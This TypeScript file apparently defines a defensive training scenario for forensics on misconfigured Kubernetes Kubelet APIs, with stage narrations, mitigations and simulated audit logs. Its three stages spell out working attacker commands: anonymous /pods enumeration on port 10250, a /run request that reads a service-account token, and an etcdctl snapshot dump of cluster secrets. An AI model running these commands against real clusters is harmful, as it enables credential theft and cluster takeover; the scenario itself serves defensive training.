import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'k8s-kubelet-anonymous-api-etcd-snapshot-forensics',
    title: 'CNCF Kubernetes Security, Microsoft Defender for Cloud & MITRE T1609 — Kubelet Read/Write Port 10250 & etcd Snapshot Forensics',
    category: 'CONTAINERS_KUBERNETES',
    mitreId: 'T1609',
    description:
      'Grounded in official Kubernetes Kubelet authentication/authorization documentation, Microsoft Defender for Cloud threat research, and MITRE ATT&CK Containers (T1609 / T1552.007): incident responders investigate misconfigured Kubelet API endpoints (--anonymous-auth=true / --authorization-mode=AlwaysAllow on TCP port 10250) and correlate container command execution (/run) with direct etcd database snapshot reads.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Internal Pod / Node Scanner', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Kubelet HTTPS API (:10250)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Container Runtime (containerd)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Kubelet Journald & Audit Log', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'etcd Key-Value Store (:2379)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Unauthenticated Pod Enumeration via Kubelet /pods Endpoint (:10250)',
        narration:
          'When Kubelet runs with --anonymous-auth=true and --authorization-mode=AlwaysAllow, any pod or host on the node network can query https://<node_ip>:10250/pods to retrieve full PodSpecs, environment variables, and mounted volume paths running on that worker node.',
        activeNodes: ['attacker', 'firewall', 'siem'],
        mitreTactic: 'Discovery (T1613 - Container and Resource Discovery)',
        technicalCommands: [
          'curl -sk https://10.10.20.11:10250/pods | jq ".items[].metadata.name"',
          'ps aux | grep kubelet | grep -- "--anonymous-auth"',
        ],
        defenseMitigation:
          'Set --anonymous-auth=false and --authorization-mode=Webhook in /var/lib/kubelet/config.yaml across all worker nodes and block port 10250 from pod CIDR ranges.',
        logs: [
          {
            id: 'k8s-kubelet-1',
            timestamp: '11:02:11.045',
            source: 'Linux Audit',
            severity: 'high',
            EventCode: 10250,
            ProcessName: 'kubelet',
            CommandLine: 'GET /pods HTTP/1.1 (Kubelet API Port 10250 Anonymous Request)',
            raw: 'kubelet[1420]: I1116 11:02:11.045112 server.go:462] "GET /pods"Resp=200 RemoteAddr="10.244.1.18:49210" User="system:anonymous"',
            parsedFields: {
              KubeletEndpoint: 'GET /pods (:10250)',
              AuthenticatedUser: 'system:anonymous',
              AuthorizationMode: 'AlwaysAllow (Misconfigured)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Remote Command Execution Inside Privileged Pod via Kubelet /run Endpoint',
        narration:
          'Using the pod namespace, pod name, and container name discovered from /pods, a POST request to /run/<namespace>/<pod>/<container> instructs Kubelet to invoke the CRI ExecSync RPC on containerd, executing arbitrary commands inside a privileged kube-system pod.',
        activeNodes: ['attacker', 'firewall', 'target', 'siem'],
        mitreTactic: 'Execution (T1609 - Container Administration Command)',
        technicalCommands: [
          'curl -sk -X POST "https://10.10.20.11:10250/run/kube-system/kube-proxy-x892a/kube-proxy" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"',
        ],
        defenseMitigation:
          'Monitor kubelet journald logs and CRI containerd events for /run or /exec requests that do not originate from the control-plane kube-apiserver IP.',
        logs: [
          {
            id: 'k8s-kubelet-2',
            timestamp: '11:02:18.610',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'containerd-shim',
            CommandLine: 'POST /run/kube-system/kube-proxy-x892a/kube-proxy cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token',
            raw: 'kubelet[1420]: I1116 11:02:18.610982 server.go:462] "POST /run/kube-system/kube-proxy-x892a/kube-proxy" Resp=200 RemoteAddr="10.244.1.18:49214"',
            parsedFields: {
              KubeletApiAction: 'POST /run/kube-system/kube-proxy-x892a/kube-proxy',
              TargetNamespace: 'kube-system',
              CriOperation: 'ExecSync via containerd-shim-runc-v2',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Control-Plane etcd Snapshot Extraction (/var/lib/etcd/member/snap/db)',
        narration:
          'If the compromised node hosts control-plane static pods or mounts /etc/kubernetes/pki/etcd, etcdctl snapshot save dumps the entire cluster state database (/registry/secrets/*), which DFIR analysts verify in etcd gRPC access logs and auditd file reads.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1552.007 - Unsecured Credentials: Container API)',
        technicalCommands: [
          'ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key snapshot save /tmp/etcd-snapshot.db',
        ],
        defenseMitigation:
          'Enable Kubernetes EncryptionConfiguration (AES-CBC or KMS v2) at rest for Secrets stored in etcd so offline snapshots of /var/lib/etcd/member/snap/db do not expose plaintext credentials.',
        logs: [
          {
            id: 'k8s-kubelet-3',
            timestamp: '11:02:29.402',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 2379,
            ProcessName: 'etcdctl',
            CommandLine: 'etcdctl --endpoints=https://127.0.0.1:2379 snapshot save /tmp/etcd-snapshot.db',
            raw: 'type=SYSCALL msg=audit(1763290949.402:608): arch=c000003e syscall=59 success=yes exe="/usr/local/bin/etcdctl" comm="etcdctl" key="etcd_snapshot_dump"',
            parsedFields: {
              DatabaseTarget: 'etcd (:2379) /var/lib/etcd/member/snap/db',
              OutputArtifact: '/tmp/etcd-snapshot.db',
              KeyPrefixTargeted: '/registry/secrets/kube-system/',
            },
          },
        ],
      },
    ],
  };
